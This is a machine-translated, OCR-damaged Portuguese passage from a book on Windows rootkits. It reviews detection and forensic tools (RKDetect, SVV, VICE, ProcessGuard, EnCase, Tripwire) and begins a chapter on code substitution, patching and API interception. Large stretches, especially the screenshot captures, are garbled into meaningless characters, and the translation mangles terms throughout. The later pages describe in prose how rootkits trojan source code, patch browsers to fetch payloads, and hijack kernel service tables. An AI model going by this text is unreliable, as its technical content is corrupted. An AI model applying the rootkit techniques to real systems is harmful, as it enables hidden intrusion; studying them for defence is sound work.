Por exemplo, o utilitário Nids Snort permite identificar o Hacker Defender
Analisar o tráfego que transmite o computador. 
RKDETECT Utility compara uma lista de serviços solicitados remotamente 
(via WMI), com uma lista recebida do Service Manager (SC) e se 
Essas listas diferem, exibe um aviso sobre o possível
A essência de Rutkin (Fig. 2.16). 
A Microsoft também não poderia ficar longe.No site da Microsoft, você pode 
Baixe o programa com título alto "REMANDANDO UM
Microsoft® Windows® (KB890830) ". 
Deve -se notar que o nome deste programa é mais longo que suas funções. 
Este não é um detector de roteador universal.O remédio da Microsoft permite 
Detecte vários tipos de programas maliciosos, como Blaster, Sasser 
e mydoom.Microsoft diz que em caso de detecção, o programa 
51

pagina: 51

Rootkits 
ajuda a remover programas maliciosos, bem como atualizar isso 
O produto é produzido a cada segunda terça -feira do mês. 
Como outros programas, um utilitário da Microsoft é extremamente simples no trabalho. 
Não requer instalação - basta iniciar um arquivo baixado.Programa 
fornecerá informações sobre cada programa malicioso que 
Ela é capaz de detectar.Depois disso, o processo de verificar o sistema começará
Depois disso, você verá um relatório.O que eu gosto na Microsoft é 
Todos os tipos de "textos acompanhantes".Observação: Programa
Ma avisa que ela não substituirá um conjunto completo 
antivírus. 
C: \ windows \ "ystem32 \ cmd.eke 
|C: \ r K D E T E C T> C S I P T R K D E T E C T.v b s 
13.1.1.1 
Microsoft 
<b> windows s c r i p t host versão 5. em 
Copyright Co Hicrosoft Corporation 1?Preencha r i g h t s 
Reseruecl 
Query s e r v i c e s por umi ... 
Detectado 6b s e r v i c e s 
Consulta S e r V i c e s por s C... 
Detectado 61 s e r v i c e s 
Encontrando Bidden 
Serviços... 
Possível r o t k i t encontrado: h
X
D Serviço 100 ~ HackerBefenderloo 
ESC J JA 
Seruice „nfthe: hackerdefenderlgo 
L.- (nl.x 
Ture 
: 10 
Uin32_0: 
Startjcype 
: 2 
AUT0_SI 
Err0r..c0ntr0l 
: 0 
Ignorar 
Binflkyjpfth_hahe 
: 
C: \ hxdefl00 ' 
Load_0rder_.gr0iip 
: 
Marcação 
: & 
DIPLAVJIFE 
: Serviço HXD 
Dependências 
EU 
Seruice_Start_Name: Localsiiten 
10 
Win32_0un_jpr0cess 
2 
Auto_stbrt 
0 
Ignorar 
C: \ HXDEF100SHXDEFL00.EXE 
|. 
Arroz.2.16.Programa RKDETECT 
Http://www.invisiblethings.org 
Eu recomendo fortemente visitar este site que pertence a
MU Especialista no combate a Rutkutti Joan Rutkovskaya.Você vai encontrar lá 
Ambos vários detectores de Rutkitte e muitos programas auxiliares. 
Aconselho você a baixar dois programas: Patchfinder e Klister.O primeiro programa 
Ajuda a detectar as rotas modificando o caminho da execução e a OMC
O paraíso serve para detectar D com combinações. 
Também neste site, você encontrará um pequeno programa de informação
MKU SVV, examinando seu sistema para determinar sua vulnerabilidade 
(Fig. 2.18). 
52

pagina: 52

CAPÍTULO 2. TODO -UP do ponto de vista do administrador
comeu
C: \ Windows \ S ¥ 5tem32 \ tmdeke
Consertar
- Tente corrigir modificações suspeitas <Sinfection>
Relatório
- Gere relatório
As opções a seguir são suportadas:
/a
Verifique todos os nódulos <pode limitar os falsos positivos)
/n
Mostre detalhes sobre modicicações
/c
Mostrar também nódulos limpos
/d
Deixar o motorista depois de terminar
/t <n>
Corrija para direcionar o nível do veredicto "n (válido para fixar confronto>
D: \ Books \ copilesrootkits \ helpnanti> svv verificação
Seguindo módulos importantes não podem ser encontrados:
ntfs.sys
Derning: módulos importantes não encontrados
Kernel32.dll
<77E6OQG0 - 7?
480Q0) ....
Infecção por Svstem Beuel: *
0 - azul
1 - verde
~> 2 - Vellou
3 - laranja
4 - vermelho
5 - Deepred
1VSH
EU
Nada suspeitava "como detectado.
D: \ Books \ Comoile \ Roothits \ Hold \ Anti>
Arroz.2.17.SW estimou o nível de segurança do sistema
PA site http://wwww.invisiblethings.org Todos os programas estão disponíveis
Junto com o código -fonte.Do ponto de vista do administrador, isso é sério
imperfeição.Afinal, o desenvolvedor Rutkitov pode baixar a fonte do detector,
Veja como funciona e escreva um algoritmo que permita que você se esconda
É deste detector.É muito mais agradável que Dizassemb
Detector Rutkin.
Você decide se espera agentes anti -contratantes comerciais, resultado
cujo código não é divulgado ou colecionar detectores de abertura
As fontes, sabendo que os criadores dos Rutkita estão sempre um passo à sua frente.
Vice: Scanner de tecnologia Ratkitte
Este programa muito pequeno (ocupa apenas 67 kb no arquivo)
Baixe em http: // www.Rootkit.com/vault/fuzen_op/vice.Fecho eclair.
Apesar de seu tamanho, o programa é capaz de determinar as armadilhas para
Tabelas IAT, SSDT e IRP.O programa consiste em duas partes - usuário
(Viceconsole. Exe) e drivers de núcleos (Vicesys.sys).O programa permite
determinar não apenas rotas usando rotina popular aquelas
Nomes que consideraremos nos capítulos seguintes, mas também estranhos
software que define suas armadilhas.Entendimento
Os programas são antivírus, firewalls e IDs locais.
Você provavelmente está surpreso com o tamanho do programa.O fato é que isso é pequeno
O programa usa uma biblioteca muito grande - Microsoft .Net Framework,
53

pagina: 53

Rootkits 
Nem todo usuário foi instalado.Vá para a Microsoft 
E veja quanto espaço é preciso: até 106 MB.Felizmente, eu não 
Eu tive que baixá -lo separadamente, porque recentemente instalei Delphi 
2005, que inclui Microsoft .Net Framework. 
Na sua essência, o programa vice é informações: ele não pega 
E apenas rotas, mas simplesmente exibe uma lista de armadilhas encontradas.Porque o 
Vice mostra absolutamente todas as armadilhas, incluindo completamente a lei
NY (Fig. 2.18), a lista é simplesmente enorme.Precisa ser visto
É com muito cuidado, caso contrário você não pode ver o próprio Rutkita - ele pode 
se perca nas entranhas desta lista. 
Lhwmfxterookie:-
WededPiocets 
& \> Acawlnd0ws \ tytf*não. 
& \ 'Acaw! 
& \?^R: 4V/INDTFV/SS! 
& \? 
i j \ y \ s, v^ndow5 \*yslem3? 
& V? 
& \ 
& V 
a \ nós \ vrtnogws \*jitt*m32 \ winlogc -rt.*w .. 
& \ ?? \ cawimdqws \ wtem32wjegoive*e ". 
£ \ 7? 
»\?L C: Windows \ jyuem32 \ wrdogort*": 
»\ R? 
^ \?AC.Windows S: .y*TEM.32WintAgoti Mk. 
& \ 
Nós? 
SOBRE S '> AC: W/SADOWS \ IYTLEM32 \ WRIK) YOR.Ems. 
& \? 
a V? 
Th ^wc'windows \ system32 \*inlogon.C.. 
& \? 
^ 
\? 
4 \? 
& \ '"AC: \ winocr". 
§ V''Ac.W1NDOV5SIY*! 
Kemetmoderootkii: 
|Nome da dll 
Kernel32.Ji 
Kern £ l32.dl 
Kernel32 dil 
K £ rnel32dll 
Kernel 3?Dll 
Kerhel32.dll 
Kerne L32 para ela 
Kernel32, Otl 
Kernels?,* 
Ksrneuzdl 
Ur> er.02di 
|Cawihdos \ sysim3aksind32.d1 
C: \ Windows 
V, yster32 \ kftme02.Dl 
Cawind0w $ \ sy "lmn32sl4" w32.di 
Cawin D0WS \ ​​SY $ IEM32 \ FC EPM132 
Kerne L32.Ji 
Kernel32.dll 
Kernel32cjt 
Kernel »dll 
Kernel32.dll 
Kernel32dm 
K £ rnel32d1 
Kernel32dh 
Kern £ l32 
Kerne L32dll 
Kern £ l32d 
IntelectedObject! 
!Função: 
I h & okaddress \ roe*ki#h 
A n t q s k r n l e> " 
Ntclwe 
0*C! Fe9070 
\ SJ "Feeir") T \ SJ "en ' 
"LMTQ5KRN.L.EXE 
Mct*aw (*j ( 
E942aso 
*T*& w 
32 \ ** "" u* 
X H T 9 8 K R N L.Exe 
Ntciwtepioc ... 
0xelfe8d9i3 
Ssyitenflo (*vsy*para "n32vd (iv9t*4jif 
J FLEÇÃO 
: 
$ eiai "" 
EU. 
Ea 
Ve & iticals 
Ecfion 
£ ntei 
COM 
Rilieats 
Eclion 
Ver 
S. 
E'c 
CR.DKionM 
G*(Piocaddi "S* 
Heapftee 
Heepajioc 
Gellasleiw 
BejewcritieAiseation 
Ruummd 
Exitwirxtowie x 
Loadt: b »ai.ya 
Loadl'tvajcxa 
Loadtisafyexw 
Uadlbtaiyw 
Gelldsci'ur 
Riurvr*nd 
Mearvezos 
Heapajoc 
HEAPFREE 
Pilhas 
Ira 
DejeteoiledSeclion 
Eweifeatseciii 
EU. 
Eavecuticals 
ECUON 
Setldstexo; 
Dele1 
Eoil 
Icals a ela 
'sul* 
ys 
A n t q s k r n l e k e 
Ntcietfepioo. 
Olvyevo 
\ Sy*temro.> Aej "l" m3avdlim "rt \ w*.*J" t 
4-nt0skrnlexe 
NcteateSecti ... 
0*E "EE1I0 
! 
^Ntqkrnlexe 
Ntcrestetnead 
Oismvva* 
\ $ y5fernroo! \ systen 
Eu n t o s k r n l e x e 
Nlenurwrale ... 
B942V22 
SPLDEYS 
INTOSKBNL, EXE 
Não. £ i*"*WW 
OYVEZU 
*pidsys 
Scan agora J. 
; 
Feito 
J. 
32 \ dnv "jsfclif 
SOBRE ... 
Lys 
V* 
J. 
Endereço de gook 
0x7715150C 
0x77 (75650 
0x771755* 
0*7716417f 
F!:, L 1yugk4 
0x7715156b 
0M771516V1 
Oh?7151502 
0N77FS25CA 
0K77! 
0*100004*) 
OxEflttlel 
0YSH155 
0xeffl3222 
OCHOZOZOZOZA 
0x77151502 
GL7? 
OH77158S51 
0x771516ot 
0x7715156 
0x77151040 
TH "77Y25M 
0*77L7555DE 
& 77175ead 
0*77 (5150C 
0x7L525S 
35 
Fhookw 
CAW No. Dots <V $ yMnn32V*l com* 
T: Windows \ Sy "L" R, 32'vnld "Dil 
S. W I N DOWS \ SY TT "NI32WDB.DLL 
D Windows \ sytfmn32 \ njdu dll 
E apragra-ivagrxhjmvfuirpns 
C: \ w^rjw5 \ sv <stem32w <jii dll 
C \ wl nd0ws vsji (l "rtf2 \ rt <e dil 
CAWL ND0WS "YTLEM32 \ ntdll.dll 
C; 
C: W I N 00WS \ ​​TVSLETV, 32 \ N (D! L DLL 
E; 
C \ w1nowsss)*ton32vai <j 
C: W'IndowsSsytiwn32 \ ntdh DL 
Q \ w (ndows \ syjl "nj2s.ildb dl 
D Windows V & Ys!Dll 
C: Vwtndow $ 45YSTHN32 \ RILDRL DIL 
C: \ Windows "y*t <m32wdb dll 
T \ winoow54sj <il "m32vrtd" .dll 
C- 
W i n dows \ syuem32 \ ntds dll 
C: \ wlndawbs'isltm32 \ nto "d" 
C: Janela $ \ syawi32 \ ntdll dl 
Cawlndows \ sylem32 \ maudl 
"EU 
-1 
• 1... 
^ 
-EU 
J. 
Zi 
Arroz.2.18.Vício em ação 
Infelizmente, o vice não pode detectar rootkuts, modificações diretamente
A memória de vocas e objetos do núcleo (em particular, fu), isso é relatado por eles 
Os autores do vício. 
E mais uma coisa: o programa tem um erro.Ela mal prescreve o motorista na sis
o tópico, amarrado a um catálogo claramente definido do qual você 
A primeira vez que eles lançaram o Vice.Isso significa que se você se mover 
Catalogar com o programa, digamos, em outro disco, você não será mais capaz de 
54

pagina: 54

CAPÍTULO 2. TODO -UP do ponto de vista do administrador 
Lançar, porque o sistema procurará o motorista no local antigo.Para 
Correções disso depois de mover o programa Excluir a seção de registro 
HKLM \ System \ CurrentControlSet \ ServicesWlSesys. 
Processuard e A N T I H O O K: Prevenção de invasão 
Programas preventivos bastante eficazes são
Xia 
ProcessGuard 
(http://www.diamondcs.com.au/processguard, 
Apenas uma versão de teste é distribuída gratuitamente) e antihook 
(http://www.infoprocess.com.au/antihook.php, 
distribui
Xia é gratuito).O primeiro protege o processo de introduzir extraordinário nele
É código e o segundo não permite que Rutkin instale uma armadilha.Ambos pro
É muito desejável instalar gramas em um computador deliberadamente "limpo", 
Caso contrário, não haverá sentido particular deles. 
Arroz.2.19.Programa de processamento de processos 
Permita que você lhe dê um pequeno conselho sobre o processo de processamento: depois da boca
O Nevkiet Installer solicitará que você reinicie o computador - concorde.EU 
Recusou e aprendeu muito sobre os componentes do processo de processamento, que para lançar 
Os programas tiveram que ser lançados manualmente.Em geral, o programa é muito 
Útil, e eu recomendo fortemente instalá -lo. 
55

pagina: 55

Rootkits 
Para forense: Encase e Tripwire 
Para combater os crimes de computador, um todo 
Seção da Ciência da Computação: Forense Técnica de Computador 
Especialização (computação forense).Algumas empresas, especialistas
Recorrendo à segurança do computador, software de liberação 
Fornecendo especificamente para o estudo de mídia de computador 
Informações (discos rígidos) por agências policiais.Esses 
Os programas são projetados para procurar disco oculto e criptografia
banheiros.Eles sabem como digitalizar não apenas o usuário 
arquivos e registro, mas também arquivos criados pelo sistema operacional 
(troca, cesta, linha de impressora), bem como setores de disco na pesquisa 
Informações remotas e residuais. 
É claro que esses programas podem encontrar rotas facilmente, fibra oculta
mentiras, catálogos e seções de registro, porque o disco do computador infectado 
Digitalizar, conectando -se a outro computador, onde o rootkit não é carregado em 
memória e, portanto, não pode modificar as tabelas do sistema e 
Chamadas para ocultar sua presença. 
Os utilitários de varredura mais poderosos são o encaseamento 
(www.encase.com) e Tripwire (http://securityfocus.com).No site 
Encase pode encomendar um disco com uma versão demo e uma descrição completa da oportunidade
programas. 
Encase verifica um disco rígido e compara cada bloco de leitura 
dados com certas amostras disponíveis em seu banco de dados. 
Para "sobreviver", Rutkin não deve conter áreas facilmente definidas 
código.Para isso, você pode, por exemplo, usar esteacanografia ou chiff
capela.Ao usar a criptografia no disco, deve 
Situado em uma parte não infectada da Rutkita, responsável pelo baralho
Dados desafiadores.Você também pode usar tecnologias polimórficas 
(Isso já é completamente da categoria de vírus).Lembre -se, Encase é o melhor em 
Será muito difícil "se locomover" para "ignorá -lo". 
Tripwire permite rastrear todas as alterações na estrutura dos arquivos e 
determinar a causa da mudança - foi a mudança nos dados pela consequência 
hackers, erro ou mudança legal.Desde o Tripwire POS
É contado nos códigos de origem, recomenda -se carregá -lo apenas no site 
http://securityfocus.com, e não em qualquer terceiro sites onde 
A versão já alterada do Tripwire pode ser postada, o que trará 
Mais mal do que bem. 
56

pagina: 56

CAPÍTULO 2. TODO -UP do ponto de vista do administrador 
Entilos jtjboofcitwte s ^ o 
FTE extensões fi pwme, Siorrf 
1.; 
.J Windows 
(MUNMR*IQ309KIT 
._,*1*ogder13p889 $ 
, Jmunimmki3.1967 $ 
> 
••- • 
-'.. i^.:}*'*| Jnins "; e" q3t34s4* 
> 
_;, »Nmjrtmtrfq31-m:? 
• *: 
- 
I, ._ jl "UnnHte! (Q3M362T 
• UtunmstaltqSISOOOF 
:;>; 
, Assim, 
;: *NturInstalq319S80 $ 
..-._Jajdiris 
]:-appp4t <: h 
EU.,.;
.
_ jcorrfig 
_: Cw "*). 
> 
S-!) 1 "'"*' cache 
1 "a^ch ph* 
Relatório de Tai ^ j, 
sobre 
"Eu <* 
z "i k i i 'eu t 
M i l 
u n f i t 
0885654 * l l l l l l l l l l l l l l 
I l l l l l l l l l l l l l l l l l l l 
•*•*"" "" 
Iiiikii 
"1 1 1 1 * 1 
K »para k i l l 
• l l l l l l " 
Para. 
EU. 
onze 
O*.ir.0 ",.* 1 * "" U * 
I0886140 I I I B I 
0886194 H 'L L L K T L 
06ZH248 K "*'*KFV 
0386302 l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l 
• • l l t l 
• I I I M I 
C 3 8 6 4 6 4 1 K 1 1 I I I I I I I I I I I 
0835762 
0885816 
0885870 
08S5924, 
: 0385? 
088603; 
10886518 
• 08 
$ t "S72 
0 .;-: '•-::> 
0886650 
*
EU. 
E 
K i r i i t 
Eu b r i i v n 
L l l l l l l l L l 
Eu eu r i i l 
OVZBPASHTTMSHYSH 
0386758 
• • • • I I I 
0 s c t -!0 1 * I L I I I I 
08870C4JI 
VOCÊ-.••, ', • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • 
******* 
• l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l 
• Usuario " 
• • * * * * * * * 
• l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l 
• l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l 
Eu para i i i l l 
D.ifeiy 
I^tjmeine 
Iwiieilili 
I i h f l s l r i 
• 1 * 1 1 
I l l l l f l l l l l l l l l l l l l l l l l l l l l l l l l l 
T r l t c l i b i i i 
* " * * * *" * * * 
I s i i r l i l 
l i h s l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l 
• 
I I! 
Eu l k v l l l l 
1 1 1 1 1 1 
Tshmt 
I M I I I I I 
I K I K K I I I I 
-;" onze 
• i j t l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l 
*•**• • 
onze .onze 
"Eu 
I I I * 
. 
M i l 
• Kim 
m
EU 
I K I I 
Eu 'k i h * 
1 * 1 1 1 1 1 
1 1 1 "! 
1 * * 1 1 
I I I " 
I K. 
onze 
I I I *: 
I I I * 
"KM" 
• 
• 
• 
] 
•; 
:
• 
.: 
Kstt 
:
; 
0887112 
'0887166 
0887220 
0887274 
0867328 
0837382 
OS*74? 
098749K "E"* 
• PLA;* 
£ j 
Texto M Hex 
.
J. 
NOME. 
Arquivo 
Ext: 
Descrição 
Último acesso 
Do credo 
Última escrita: 
: •>. 
N Relatório I ^2cents 
drvmain.sdb 
Sdb 
Arquivo, compactado 
05/14/0210.06: 51 
14/05/0210: 06 51 
30/11/01 01 31 44 
_D $/d4*0^diH1 £ 
***** 
* " * * * * 
l i i l 
1 1 * * 1 
Shshsh 
Shshshch 
Shtesa 
• i p 
• i i 
***** 
"I K I I 
***** 
**** " 
l i i l 
• I I I * 
1mzh1.k 
******** 
* * "• * • * * * * 
R i 1 i 1 r i i 
*** "*"*.* 
"M i l l * 
• 
Espinho 
Vya.shsh.shyash 
**: **** "* 
1 * * * 1 * 1 1 
""bolsas 
Iw * m i n * 
• 
Espinho 
******** 
M l * * * * * * * 
I i i n i i 
F i r i i t 
• l l l l l l l " 
1 1 * 1 * 1 * 1 
EU
Sh
E
N 
1 1 1 1 1 
1 1 1 1 1 
1 1 1! 
'1 1 1. 
1 1 1. 
1 1 1 1 1 
* • • • • '' 
milímetros.milímetros 
R i b " 
• '• 
• 
• -
'... 
• Eu l l l l l l 
1 1 1 * 
1 1 * 1 
• 1 1 1 1 
:
-
.: 
1 1 1! 
• Eu l l l l l l 
I I I 
L l l l l l l l l l l l l l L l 
1: 1 1 * 1 1 1 1 1 
* " *" * * * * 
L l l l l l l l l l l l l l L l 
K i i r i k i k 
S?* * * * l l * 
L l l l l l l l l l l l l l L l 
K i l i i i » * 
'Eu k.* "Eu l l l l l l 
L l l l l l l l l l l l l l L l 
Shtkzhstyazh 
"L l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l 
L l l l l l l l l l l l l l L l 
I f i n i i t 
L l l l l l l l l l l l l l L l 
L l l l l l l l l l l l l l L l 
L l l l l l l * 
L l l l l l l l l l l l l l L l 
L l l l l l l l " 
L l l l l l l * 
'LL l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l 
n e p * 
I i i i i l l l l l l l l l l l l l l l l l l l 
L l l l l l l * 
L l l l l l l l l l l l l l L l 
W m * k & -s * s
S. 
C.
N
E
E 
L l l l l l l l l l l l l l L l 
L l l l l l l l l l l l l l L l 
eu n i m i 
T para n e 
Eu l f l r i i r 
L l l l l l l l l l l l l l L l 
L l l l l l l * * 
• l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l l 
L l l l l l l l l l l l l l L l 
L l l l l l l l l l l l l l L l 
L l l l l l l l L l 
L l l l l l l l L l 
• • • 1 1 1 1 
1 * 1 * * 1 
L l l l l l l l L l 
I I "I I I I 
n i t i i 
I H I H I 
X ph n *. 
EU 
* T. 
Mmmmmmm 
1 8 "s * s 
"• 111" ' 
I I I I I I I 
• • 1 1 1 1 
1 1 1 I I 
1 1 1 1 * 
*
*
*
*
* 
1 1 1 1 " 
I K I I I I 
• Matar 
OI "'' 
11:11 " 
.:.: •, • 
Para 
Tt.T.SH 
Mm »mm 
em "" 
1 1 1 1 " 
Matar " 
• Matar 
• 1 1 1 1 1 
Schtyat. 
" 
e »K. 
P e K. 
eu m k i 
t e n e 
Eu: "Eu" 
* 
Ii. 
» * * * •» • 
n n i i i i 
Ikllll'l 
L l l l l l l l L l 
L l l l l l l l l l l l l l l 
"I S I I I I I 
"1 1 * 1 * 1 
L l l l l l l l l l l l l l l 
Colina: * * * 
S i l i k " 
L l l l l l l l l l l l l l l 
I I I I I I I 
*
*
*
*
*
*
* 
n n i i i i 
Iiiikii 
L l l l l l l l l l l l l l l 
L l l l l l l l l l l l l l l 
L l l l l l l l l l l l l l l 
I I I K I I 
1 1 1 b i l l 
eu l r i i r i 
L l l l l l l l l l l l l l l 
L l l l l l l l l l l l l l l 
" E " "
'
" 
L l l l l l l l l l l l l l l 
I i "k" "k" 
m i n i 
I n i i i i 
n e " 
n n i i i i 
l l l i i m l 
Eu "k i * eu r 
Espinho 
t t i t u 
*I*j*eu 
BSSEH 
Illtlll 
EU 
E 
• Em 
H i l l l l l 
1 1 1 * 
1 1 1 " 
onze * 
1 1 "K 
1 1 1 1 1 
1 1 1 " 
• * • • • • • • 
• 1 1 1 1 
t i l l 
1 1 1 1 1 
1 1 1 1 1 
Km "' 
1 1 1 
I I I 
I S I 
*'** 
M l * 
• EU * 
1 1 1 
1 1 1 
"Ft*. 
Doente 
1 1 1 
onze 
1 1 1 
1 * 1 D 
.- ensapts;f FTets (;;; 
Vbikripts 
£ 2 inclua 
* J Case de varredura 
PernComhunter^cvm> cowa^uwra^3l9580 $ <dr^"n,! Db (ps886s27 
5th H H M CL 221616 50000 FO0 1E0) 
Arroz.2.20.Programa de Encase 
57

pagina: 57

Capítulo 3. Substituindo como uma imagem 
A vida de Rutkin 
• 
Substituição de código 
• 
Interceptação no nível do usuário 
• 
A introdução do código Rutkit na de outra pessoa 
PROCESSO 
• 
Patching "Raid" 
• 
Explorit e Rutkit tocam juntos 
Rootkits

pagina: 59

O princípio básico do trabalho de Rutkin é uma modificação ou substituição. 
Programas, incluindo o próprio sistema operacional, são projetados para 
Processamento de determinados dados e saída de certos resultados. 
Rutkit pode moer dados ou o próprio programa para que ele 
Deduzi os resultados corretos, mas aqueles que Rutkin precisa.Além disso, pro
O código Gram pode ser substituído quando não é carregado na memória e 
está no disco como um arquivo ou biblioteca executável e diretamente 
em mente.O último método é chamado de interceptação, e já estamos mencionando sobre isso
Minali. 
Parece que os dados são mais fáceis de substituir.Mas, já que é sobre 
Processos e arquivos de ocultação, os dados substituídos por Rutkin são 
Dados nucleares (tabelas do sistema).Então, vamos falar um pouco no começo 
Sobre as maneiras de modificar o código no disco, depois em mais detalhes - sobre a interceptação sobre 
nível do usuário e interceptação no nível do núcleo, adiaremos no capítulo 5, antes 
que vou informar sobre as informações sobre o dispositivo sobre o dispositivo e 
Windows Core Functioning. 
3.1.Substituição de código 
3.1.1.Modificação do código -fonte 
Algum software é distribuído nos códigos de origem. 
Geralmente estes são programas distribuídos livremente.Você pode baixar 
código -fonte, altere um pouco e coloque -o em algum lugar na Internet, emitindo para 
A versão original. 
60

pagina: 60

Capítulo 3. Crazy como um estilo de vida de Rutkita 
Usuário desavisado baixará sua cópia da fonte 
E compila -o em seu computador.Para coletar o programa,
precisamente das qualificações médias do usuário, mas para desaparecer
Assuma o que o programa faz, olhando para o seu código -fonte, você precisa ser 
Programador.E é improvável que o usuário comum observe isso na fonte 
O código adicionou uma função que envia alguns dados interessantes para não
conhecido por este usuário (mas bem conhecido pelo cracker) e -mail 
caixa. 
O problema da modificação do código -fonte é especialmente agudo no mundo de
Software coberto (código aberto).Você viu em algum lugar 
Os códigos de origem do notebook?Sim, é mais fácil escrever um caderno do que encontrá -lo IP
Códigos de Croof.Mas no Software de código aberto mundial
É acionado para a forma dos códigos de origem.Você pode carregar livremente até 
Os códigos de origem do núcleo Linux - por favor, www.Núcleo.Org. 
Você acha que isso é apenas uma teoria?Agora vou dar um exemplo de real
Noah vida.Em 2003, usando a substituição do código -fonte, houve
Os servidores FTP do projeto GNU, que ocupam o primeiro lugar em 
Código aberto mundial.Você pode ler o relatório sobre esta história no endereço 
http://www.sert.org/advisories/ca-2003-21.html. 
3.1.2.Patching 
Patch (patch) é um programa especial que faz alterações 
No programa principal, por exemplo, corrige os erros cometidos ou 
Faz funções adicionais.Teoricamente, você pode perfurar Liu
um programa de bóia, adicionando funções adicionais a ele ou mudando já 
existir.Por exemplo, você pode se propagar o IE para que seja gradualmente 
Eu baixei o resto do Rutkin da Internet assim que o usuário 
Conecte-se a internet.Mesmo se um firewall estiver instalado no computador, 
Ele não proibirá o Internet Explorer, porque ele "pensará" que 
Esses arquivos são baixados pelo próprio usuário.O usuário não é nada para
Marcas porque o restante das funções do navegador funcionará como de costume: 
Ele poderá visualizar páginas da web, ir para FTP, etc.
casos de centeio, se o programa for corretamente corretamente, o usuário pode 
adivinhe o que está acontecendo, de acordo com a "inibição" perceptível do navegador ou por 
erros ao iniciar e concluir o trabalho. 
Patching também pode ser usado para alterar libras existentes
Knium do programa.Muitas vezes, os patches são usados ​​para remover a proteção 
programas ou recebendo oportunidades adicionais. 
Por exemplo, se ao iniciar o programa verificar, ele será registrado 
61

pagina: 61

Rootkits 
ou não, você pode perfurá -lo para que a função responsável pelo teste, 
Sempre retornou "subiu" um resultado positivo. 
Nos jogos de computador, os patches são frequentemente usados ​​para obter adicionais
recursos, por exemplo, "imortalidade", número ilimitado
A honra do dinheiro, etc. 
Você pode lutar contra patches.E o produto é bastante simples.Você precisa 
Instale o programa de auditor no computador.O auditor será calculado por CRC 
(quantidade de controle) de todos os arquivos (mais precisamente, toda a vanidade do sistema: 
Se você controla todos os arquivos, os recursos do sistema, Bo
Eu não sou suficiente) em seu disco rígido e vou escrever em seu banco de dados
Nova Iorque.Mesmo se você mudar um byte do arquivo, seu controle 
soma. 
O auditor pode estar constantemente na memória e controlar o conteúdo
Estrelando catálogos sistemáticos.Assim que algum programa quiser 
Modifique o arquivo do sistema (como regra, esses são arquivos de catálogo 
% Windir% e todos os seus subcatais, bem como arquivos de catálogo de programas 
Arquivos em todos os discos), o auditor bloqueia este programa e pergunta, 
o que fazer a seguir.Se você definir o programa em que garante
nós que é obtido de uma fonte confiável, você pode permitir a instalação, 
Caso contrário, você precisa descobrir onde este programa penetrou em 
Seu sistema. 
Além do modo de monitor, os auditores modernos têm um modo de scanner. 
Nesse modo, o auditor não está constantemente na memória, retirando 
Recursos, mas começa a seu pedido e supera o alarme se CRC 
Qualquer arquivo de corte de sistema mudou.Se isso é uma mudança 
Não autorizado por você, você pode reinstalar este arquivo de re
cópia ou distribuição de grãos, caso contrário, o auditor fará 
mudanças relevantes no seu banco de dados, e não haverá mais 
Residir você. 
É importante que o auditor esteja instalado no sistema inicialmente "limpo".Se in 
O sistema já foi apresentado arquivos, o auditor assumirá que com eles 
Tudo está bem.Então haverá pouco benefício dele. 
O Windows tem seu Auditor de tempo completo - Serviço de Proteção de Arquivos e Catalo
Gov, mas o programa malicioso sabe disso e pode desligar se o piso
Chit do privilégio do administrador.Portanto, é recomendado adicionalmente 
Instale um auditor estranho, que o programa patcher não pode 
detectar e desativar. 
62

pagina: 62

Capítulo 3. Crazy como um estilo de vida de Rutkita 
3.2.Interceptação no nível do usuário 
O SO Windows fornece conjuntos de funções padrão que permitem 
Os aplicativos se comunicam com equipamentos, usuário e entre si.Esses 
As funções são chamadas de API (interface do programador de aplicativos). 
Os autores do Rutkin estão especialmente interessados ​​na API nativa - a interface entre 
Aplicação e serviços do núcleo do sistema operacional.O ajuste usual
as funções da API nacional através de uma API de um nível superior, que
Kei como uma API ou Posix Win32, mas o cracker precisa de grande flexibilidade. 
Os nomes das funções da API nativa começam com o prefixo "nt", e é para 
refere -se à função de Ormation ntQuerySystemlnf, que mencionei
Ele amassou no parágrafo 1.6.2.Essas funções são exportadas pela biblioteca ntdll.dll, 
E sua descrição pode ser encontrada em Mark Russinovich em H t p: / / / / 
www.sysinternals.com/1nformation/nativeapi.html.Oficial
Certificado Naya (da Microsoft) para alguns deles está no Windows 
Kit de driver de dispositivo NT (DDK), sobre o qual falaremos no cap.5. 
Quando o aplicativo no modo de usuário causa uma função NT, 
O NTDLL gera uma interrupção de software 0x2E.Esta é uma interrupção sobre
É preparado pelo processador de interrupção do núcleo KeisteMService, 
que é transmitido ao índice de função na tabela KisystemServicetable. 
Então, se o cracker escorregar um endereço falso nesta tabela, pode
Preencha seu próprio código no modo núcleo que fornece ilimitado
acesso a todos os recursos do sistema. 
OBSERVAÇÃO. 
Começando com o Windows 2000, em vez de interrupção em 0x2e, um especial 
Instruções - Sysenter para processadores Intel ou SyScallftrm AMD Processores. 
Mas eu corri adiante, mas por enquanto estamos falando sobre interceptação das funções da API, 
executado inteiramente no nível do usuário, ou seja, função
Ti das bibliotecas kernel32.dll, user32.dll, gui32.dll e ad-
VAPI.DLL.Essas funções são chamadas de aplicativos TaskMgr.exe 
(Windows Tasks Manager), E X P L O R E R.E x e (condutor do Windows) e 
r e g e d i t.E x e (editor de registro) que o usuário lança, 
Querendo visualizar a lista de processos, arquivos e chaves de registro.Aqui 
e faça isso para que esses processos, arquivos e chaves 
Queremos nos esconder com a ajuda de Rutkin, ele não viu. 
Você pode conseguir isso de duas maneiras: 
• 
substituição da própria função da API; 
• 
Substituição de dados processados ​​pela função da API. 
63

pagina: 63

Rootkits 
No primeiro caso, a lógica é simples: escrevemos nosso análogo da função da API,
Pegue a chamada da função inicial da API e, em vez de ela, executamos nossa diversão
Kriya.Nossa função causa a função inicial, obtém seu resultado, 
